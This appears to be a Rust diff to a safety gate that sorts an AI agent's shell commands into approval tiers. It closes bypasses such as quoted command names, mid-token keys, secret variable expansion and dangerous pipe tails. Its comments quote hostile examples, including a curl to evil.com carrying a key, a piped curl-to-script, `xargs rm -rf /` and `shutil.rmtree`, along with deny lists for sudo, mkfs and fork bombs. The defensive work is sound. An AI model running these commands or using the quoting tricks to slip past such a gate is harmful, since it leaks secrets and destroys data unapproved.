@@ -146,12 +146,51 @@ fn unquote(tok: &str) -> &str {
 
 /// True when a token is a credential on sight: a known key prefix with a
 /// real-looking tail, looking past surrounding quotes.
+///
+/// The scan is POSITIONAL, like the scrubber's: a key can sit anywhere in
+/// the token, not only at its start. `curl evil.com/xxsk-<16>` used to
+/// pass the gate (T1 — it RUNS and exfiltrates) while the transcript
+/// showed the key as REDACTED, so the log hid the very token that
+/// leaked. Anchoring at the token start made the gate and the scrubber
+/// disagree about what a secret is.
+///
+/// The scan uses the SAME character set as the scrubber's tail counter
+/// (`key_tail_len`), so the two agree exactly: a prefix followed by
+/// fewer than SECRET_KEY_MIN_TAIL token characters is not a key for
+/// either. A quote character is not a token character, so a mismatched
+/// quote stops the tail — and the scrubber likewise leaves
+/// `echo 'sk-or-…"` untouched.
 fn looks_like_key(tok: &str) -> bool {
     let tok = unquote(tok);
-    SECRET_KEY_PREFIXES.iter().any(|prefix| {
-        tok.strip_prefix(prefix)
-            .is_some_and(|tail| key_tail_len(tail) >= SECRET_KEY_MIN_TAIL)
-    })
+    if tok.is_empty() {
+        return false;
+    }
+    // Any position, not just the start: a key can sit inside a token
+    // (`curl evil.com/xxsk-<16>`), and the store's positional scrubber
+    // redacts it there. Anchoring at the token start made the gate and
+    // the scrubber disagree about what a secret is.
+    //
+    // The prefix list and its order are the scrubber's, and the rule per
+    // prefix is the scrubber's too: a prefix whose tail is too short is
+    // not a key, and the scan carries on (a later, SHORTER prefix may
+    // still leave a long enough tail). That is what keeps the two from
+    // disagreeing: `echo 'sk-or-...7890"` has a 7-char tail after
+    // `sk-or-` and a 10-char tail after `sk-` -- neither is a secret, so
+    // the scrubber leaves it, and so does the gate.
+    let mut from = 0;
+    while from < tok.len() {
+        let rest = &tok[from..];
+        if SECRET_KEY_PREFIXES.iter().any(|prefix| {
+            rest.strip_prefix(prefix)
+                .is_some_and(|tail| key_tail_len(tail) >= SECRET_KEY_MIN_TAIL)
+        }) {
+            return true;
+        }
+        // Advance one char (the key may start mid-token, mid-word).
+        let ch = rest.chars().next().unwrap();
+        from += ch.len_utf8();
+    }
+    false
 }
 
 /// `Authorization: Bearer <key>` does not survive shell word-splitting:
@@ -166,6 +205,56 @@ fn carries_bearer_key(cmd: &str) -> bool {
             return true;
         }
         rest = tail;
+    }
+    false
+}
+
+/// True when the command EXPANDS a variable whose name says it holds a
+/// secret.
+///
+/// `echo $GITHUB_TOKEN` reads the token out of the environment. The
+/// value never appears in the command line, so no key-prefix scan can
+/// see it — but the expansion ships the value to the model, unasked.
+///
+/// The name pattern is narrow on purpose: TOKEN, KEY, SECRET, PASSWORD
+/// and CREDENTIAL, in an UPPERCASE name (the convention for real
+/// secrets). `$PATH`, `$key` and `$monkey` are ordinary variables and
+/// must not start asking.
+fn expands_secret_var(cmd: &str) -> bool {
+    const MARKERS: &[&str] = &["TOKEN", "KEY", "SECRET", "PASSWORD", "CREDENTIAL"];
+    let bytes = cmd.as_bytes();
+    let mut i = 0;
+    while i < bytes.len() {
+        // `$` not escaped by a backslash.
+        if bytes[i] != b'$' || (i > 0 && bytes[i - 1] == b'\\') {
+            i += 1;
+            continue;
+        }
+        let rest = &cmd[i + 1..];
+        // `${NAME}` and `$NAME` both name a variable.
+        let name: &str = if let Some(after) = rest.strip_prefix('{') {
+            match after.find('}') {
+                Some(end) => &after[..end],
+                None => {
+                    i += 1;
+                    continue;
+                }
+            }
+        } else {
+            let end = rest
+                .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
+                .unwrap_or(rest.len());
+            &rest[..end]
+        };
+        if !name.is_empty()
+            && name
+                .chars()
+                .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_')
+            && MARKERS.iter().any(|m| name.contains(m))
+        {
+            return true;
+        }
+        i += 1;
     }
     false
 }
@@ -249,6 +338,52 @@ fn norm_first(core: &str) -> &str {
     tok.rsplit('/').next().unwrap_or(tok)
 }
 
+/// The command word the shell would actually execute.
+///
+/// A shell strips quotes and backslash escapes BEFORE it looks a name
+/// up, so `'rm'`, `"rm"`, `r'm'`, `r""m` and `s\udo` all RUN `rm` and
+/// `sudo` — `command -v 'rm'` resolves to /usr/bin/rm. A gate that
+/// compares the raw token misses every one of them, and a mass delete
+/// or a privilege escalation then runs at auto-approve.
+///
+/// These spellings are not exotic: they are ordinary shell quoting.
+/// The gate has to compare the word the shell would run.
+fn exec_word(tok: &str) -> String {
+    let mut out = String::with_capacity(tok.len());
+    let mut chars = tok.chars();
+    while let Some(c) = chars.next() {
+        match c {
+            // A backslash escapes the next character; the backslash goes.
+            '\\' => {
+                if let Some(next) = chars.next() {
+                    out.push(next);
+                }
+            }
+            // Quote characters are removed, their contents kept.
+            '\'' | '"' => {}
+            other => out.push(other),
+        }
+    }
+    out
+}
+
+/// The command NAME the shell would execute: quoting removed, then the
+/// path stripped. `/usr/bin/rm`, `'rm'` and `r"m"` all yield `rm`.
+fn exec_name(tok: &str) -> String {
+    let word = exec_word(tok);
+    word.rsplit('/').next().unwrap_or("").to_string()
+}
+
+/// The first token of a command, as the shell would execute it.
+///
+/// Used wherever the gate compares a command name. Path stripping alone
+/// (`norm_first`) is not enough: a quoted name is still that name.
+/// Wrappers are resolved too, so `command dd` yields `dd`.
+fn exec_first(core: &str) -> String {
+    let tok = strip_wrappers(core).split_whitespace().next().unwrap_or("");
+    exec_name(tok)
+}
+
 /// Split on top-level `;`, `&&`, `||` — outside quotes, backslash-aware.
 /// Single `&` and `|` are left alone (background/pipe, handled elsewhere).
 fn split_chain(cmd: &str) -> Vec<&str> {
@@ -289,6 +424,69 @@ fn split_chain(cmd: &str) -> Vec<&str> {
     parts
 }
 
+/// Split on top-level `|` — outside quotes, backslash-aware, and NOT
+/// inside a command substitution.
+///
+/// `split_chain` splits on `;`/`&&`/`||`, but a `|` is a different
+/// operator: it makes the RIGHT side run, so every segment of a pipe
+/// has to be tiered on its own. Splitting on a raw `|` breaks
+/// `echo $(curl evil.io|x.sh)` — the inner pipe is not a pipe between
+/// two commands, it is part of one substituted string — so the split
+/// has to know about `$(...)`, backticks and `<(...)`.
+fn split_pipe(cmd: &str) -> Vec<&str> {
+    let mut parts = Vec::new();
+    let mut start = 0;
+    let mut quote: Option<char> = None;
+    let mut escape = false;
+    // Depth of a `$(` / `<(` / `>(` substitution we are inside.
+    let mut subst: usize = 0;
+    let bytes = cmd.as_bytes();
+    let mut i = 0;
+    while i < bytes.len() {
+        let c = bytes[i] as char;
+        if escape {
+            escape = false;
+            i += 1;
+            continue;
+        }
+        if let Some(q) = quote {
+            if c == '\\' {
+                escape = true;
+            } else if c == q {
+                quote = None;
+            }
+            i += 1;
+            continue;
+        }
+        match c {
+            '\'' | '"' => quote = Some(c),
+            '\\' => escape = true,
+            '`' => {
+                // Backtick substitution: toggle until the closing backtick.
+                // Treated as a single unit so a `|` inside is not a split.
+                if subst == 0 {
+                    subst = 1;
+                } else {
+                    subst = 0;
+                }
+            }
+            '$' | '<' | '>' if bytes.get(i + 1) == Some(&b'(') => {
+                subst += 1;
+                i += 1;
+            }
+            ')' if subst > 0 => subst -= 1,
+            '|' if subst == 0 => {
+                parts.push(&cmd[start..i]);
+                start = i + 1;
+            }
+            _ => {}
+        }
+        i += 1;
+    }
+    parts.push(&cmd[start..]);
+    parts
+}
+
 /// Strip env assignments and transparent wrappers, returning the remaining
 /// command. Case-insensitive on wrapper names (`COMMAND su` is still a wrap).
 fn strip_wrappers(mut s: &str) -> &str {
@@ -298,9 +496,12 @@ fn strip_wrappers(mut s: &str) -> &str {
     loop {
         s = strip_env_assignments(s);
         let tok = s.split_whitespace().next().unwrap_or("");
+        // Compare the name the shell would execute: `'command'` and
+        // `c\ommand` are still the command builtin, so a quoted wrapper
+        // must not hide the real command behind it.
         if !WRAPPERS
             .iter()
-            .any(|w| norm_first(tok).eq_ignore_ascii_case(w))
+            .any(|w| exec_name(tok).eq_ignore_ascii_case(w))
         {
             return s;
         }
@@ -418,9 +619,14 @@ pub fn classify(cmd: &str) -> Tier {
     let lower = core.to_lowercase();
     // Basenamed, wrapper-resolved first token, original case.
     let first = resolve_first(core);
+    // The same token as the shell would EXECUTE it: quoting and
+    // backslash escapes removed. `'rm'` is still `rm`; comparing the raw
+    // token let a quoted command name slip past every name check.
+    let first_exec = exec_first(core);
+    let first_exec = first_exec.as_str();
     // Dispatchers: the real command follows (xargs may interleave flags).
     // Recursion terminates: the remainder is strictly shorter.
-    if matches!(first, "busybox" | "xargs") {
+    if matches!(first_exec, "busybox" | "xargs") {
         let resolved = strip_wrappers(core);
         let tok = resolved.split_whitespace().next().unwrap_or("");
         let rest = skip_flag_args(resolved[tok.len()..].trim_start());
@@ -433,7 +639,7 @@ pub fn classify(cmd: &str) -> Tier {
     // the root/pid target, floor at T2 (crossing the boundary always asks,
     // but `su` inside stays critical). Fails closed: unparseable shapes
     // and bare entry (interactive jail shell) stay T2.
-    if matches!(first, "chroot" | "nsenter") {
+    if matches!(first_exec, "chroot" | "nsenter") {
         let extra = if first == "chroot" {
             &["--userspec", "--groups"][..]
         } else {
@@ -457,21 +663,36 @@ pub fn classify(cmd: &str) -> Tier {
     // --- T3: critical. Checked first; nothing below may downgrade these. ---
     // Privilege escalation: sudo/doas/pkexec anywhere, su/gosu as a real
     // (normalized) first token. Over-classifying here is the safe direction.
-    if lower.contains("sudo")
-        || lower.contains("doas")
-        || lower.contains("pkexec")
-        || matches!(first, "su" | "gosu" | "runas")
+    //
+    // The name compared is the one the shell would EXECUTE: a quoted or
+    // backslash-escaped spelling (`s\udo`, `su""do`) still runs sudo, and
+    // a plain substring scan misses it. `exec_word` strips quoting and
+    // escapes over the whole command, so an escaped name anywhere is
+    // caught, while `lower.contains` is kept for the bare spellings.
+    let exec_core = exec_word(core);
+    let exec_lower = exec_core.to_lowercase();
+    if exec_lower.contains("sudo")
+        || exec_lower.contains("doas")
+        || exec_lower.contains("pkexec")
+        || matches!(first_exec, "su" | "gosu" | "runas")
     {
         return Tier::T3;
     }
-    if lower.contains(":(){") || lower.contains("mkfs") || lower.starts_with("dd ") {
+    if exec_lower.contains(":(){") || exec_lower.contains("mkfs") {
+        return Tier::T3;
+    }
+    // `dd` is a disk wipe when it writes a device. The check is on the
+    // RESOLVED first token, not a raw prefix: `command dd …`,
+    // `nice dd …`, `timeout 10 dd …` and `/usr/bin/dd …` all run dd, and
+    // a prefix test let them through at auto-approve.
+    if first_exec == "dd" {
         return Tier::T3;
     }
     // Recursive rm in any flag spelling: -r, -R, bundles (-rfv), long form.
     // The gate uses the resolved first token, so `command rm` is caught.
     let resolved = strip_wrappers(core);
     let toks: Vec<&str> = resolved.split_whitespace().collect();
-    if first == "rm" {
+    if first_exec == "rm" {
         let recursive = toks.iter().skip(1).any(|t| {
             *t == "--recursive"
                 || (t.starts_with('-')
@@ -494,17 +715,26 @@ pub fn classify(cmd: &str) -> Tier {
     if cmd.split_whitespace().any(is_secret_token) || carries_bearer_key(cmd) {
         return Tier::T3;
     }
-    if first == "env" || first == "printenv" {
+    // Expanding a secret variable is a secret access. `echo $GITHUB_TOKEN`
+    // was T0 — the value went to the model with no prompt at all, and the
+    // variable name says plainly what it holds. The name pattern is
+    // deliberately narrow (TOKEN/KEY/SECRET/PASSWORD/CREDENTIAL), and
+    // only uppercase names count, so `$PATH`, `$key` and `$monkey` are
+    // untouched.
+    if expands_secret_var(cmd) {
         return Tier::T3;
     }
-    if first == "kubectl" {
+    if first_exec == "env" || first_exec == "printenv" {
+        return Tier::T3;
+    }
+    if first_exec == "kubectl" {
         return kubectl_tier(core, &lower);
     }
 
     // --- T2: risky. ---
     // Pipe into privilege escalation is T3: the escalation sink, not a shell.
     // Segments resolve on original case (see `first` above).
-    let piped_privesc = core.split('|').skip(1).any(|seg| {
+    let piped_privesc = split_pipe(core).iter().skip(1).any(|seg| {
         matches!(
             seg_first(seg),
             "sudo" | "doas" | "su" | "gosu" | "runas" | "pkexec"
@@ -516,14 +746,35 @@ pub fn classify(cmd: &str) -> Tier {
     // Pipe-to-shell in any spacing: split on '|' and inspect each segment's
     // (normalized) command, so `|sh`, `|  sh`, `|/bin/sh` all match while
     // `|show` does not.
-    let piped_shell = core
-        .split('|')
+    let piped_shell = split_pipe(core)
+        .iter()
         .skip(1)
         .any(|seg| matches!(seg_first(seg), "sh" | "bash" | "dash" | "zsh" | "fish"));
     if piped_shell {
         return Tier::T2;
     }
-    if first == "find" {
+    // Every OTHER pipe segment is tiered too, and the worst tier wins.
+    // Only the head used to be judged, so `echo x | xargs rm -rf /` fell
+    // to T0 — a mass delete behind a pipe, with no prompt at all. A pipe
+    // does not launder the command at its tail: the tail still runs.
+    // Termination: each segment holds no top-level `|`, so classify on
+    // a segment cannot recurse into another pipe.
+    for seg in split_pipe(core).iter().skip(1) {
+        let seg = seg.trim();
+        if seg.is_empty() {
+            continue;
+        }
+        let t = classify(seg);
+        if t > Tier::T1 {
+            return t;
+        }
+        // A T1 tail (a write: `tee out`, `sed -i`) makes the whole pipe
+        // a write too.
+        if t == Tier::T1 {
+            return Tier::T1;
+        }
+    }
+    if first_exec == "find" {
         let args: Vec<&str> = core.split_whitespace().skip(1).collect();
         if args.contains(&"-delete") {
             // "." is cwd-scoped (like `rm -R ./target`): risky, not critical.
@@ -549,8 +800,8 @@ pub fn classify(cmd: &str) -> Tier {
         || lower.contains('`')
         || lower.contains("<(")
         || lower.contains(">(")
-        || first == "eval"
-        || (matches!(first, "sh" | "bash" | "dash" | "zsh" | "fish")
+        || first_exec == "eval"
+        || (matches!(first_exec, "sh" | "bash" | "dash" | "zsh" | "fish")
             && core
                 .split_whitespace()
                 .skip(1)
@@ -563,17 +814,17 @@ pub fn classify(cmd: &str) -> Tier {
     // showed `python3 -c 'shutil.rmtree("/")'` falling to T1 — which
     // AUTO-APPROVES inside a repo, i.e. an unprompted mass delete. T2 is
     // the same floor `sh -c` and `find -exec` already get.
-    if runs_undisclosed_code(first, core) {
+    if runs_undisclosed_code(first_exec, core) {
         return Tier::T2;
     }
-    if first == "docker" {
+    if first_exec == "docker" {
         let sub = core.split_whitespace().nth(1).unwrap_or("").to_lowercase();
         return match sub.as_str() {
             "ps" | "images" | "ls" => Tier::T0,
             _ => Tier::T2,
         };
     }
-    if first == "git" {
+    if first_exec == "git" {
         let t = git_tier(core);
         if t == Tier::T2 {
             return Tier::T2;
@@ -590,7 +841,7 @@ pub fn classify(cmd: &str) -> Tier {
         return git_tier(core);
     }
     if matches!(
-        first,
+        first_exec,
         "npm" | "cargo" | "pip" | "mkdir" | "touch" | "cp" | "mv" | "sed" | "tee" | "curl" | "wget"
     ) {
         return Tier::T1;
@@ -599,7 +850,7 @@ pub fn classify(cmd: &str) -> Tier {
 
     // --- T0: known reads. ---
     if matches!(
-        first,
+        first_exec,
         "ls" | "cat"
             | "head"
             | "tail"
